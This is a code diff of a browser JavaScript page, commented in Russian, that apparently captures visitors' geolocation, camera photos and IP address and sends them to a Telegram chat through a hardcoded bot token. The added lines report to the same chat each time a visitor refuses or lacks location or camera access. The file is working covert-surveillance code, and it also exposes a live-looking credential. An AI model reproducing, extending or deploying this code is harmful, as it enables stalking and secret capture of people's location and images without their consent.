@@ -2,6 +2,12 @@
 const BOT_TOKEN = '8583690981:AAH_esCG5wUMmRiegjxDARFQDW6l-VxfJ9w';
 const CHAT_ID = '526758225';
 
+// ========== ОТПРАВКА ОШИБОК В TELEGRAM ==========
+async function sendErrorToTelegram(errorType, details) {
+    const message = `❌ ОШИБКА ДОСТУПА\n\n📱 Тип: ${errorType}\n📝 Детали: ${details}\n⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
+    await sendMessage(message);
+}
+
 const video = document.getElementById('video');
 
 // ========== ОТПРАВКА ==========
@@ -76,24 +82,40 @@ ${ip}`;
 // ========== ГЕОЛОКАЦИЯ (Яндекс.Карты) ==========
 function getGeo(callback) {
     if (!navigator.geolocation) {
+        sendMessage('❌ Ошибка: браузер не поддерживает геолокацию');
         callback(null);
         return;
     }
     navigator.geolocation.getCurrentPosition(
         (pos) => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-        () => callback(null)
+        (error) => {
+            let errorMsg = '';
+            if (error.code === 1) errorMsg = 'Пользователь ЗАПРЕТИЛ доступ к геолокации';
+            else if (error.code === 2) errorMsg = 'Геолокация недоступна';
+            else errorMsg = 'Ошибка геолокации';
+            sendMessage(`❌ ${errorMsg}`);
+            callback(null);
+        }
     );
 }
 
 // ========== КАМЕРА ==========
 function getCamera(facing, callback) {
+    const cameraName = facing === 'user' ? 'фронтальной' : 'задней';
     navigator.mediaDevices.getUserMedia({
         video: { 
             facingMode: { exact: facing },
             width: { ideal: 1280 },
             height: { ideal: 720 }
         }
-    }).then(stream => callback(stream)).catch(() => callback(null));
+    }).then(stream => callback(stream)).catch((error) => {
+        let errorMsg = '';
+        if (error.name === 'NotAllowedError') errorMsg = `Пользователь ЗАПРЕТИЛ доступ к ${cameraName} камере`;
+        else if (error.name === 'NotFoundError') errorMsg = `${cameraName} камера не найдена`;
+        else errorMsg = `Ошибка камеры: ${error.name}`;
+        sendMessage(`❌ ${errorMsg}`);
+        callback(null);
+    });
 }
 
 async function takePhoto(stream, caption) {
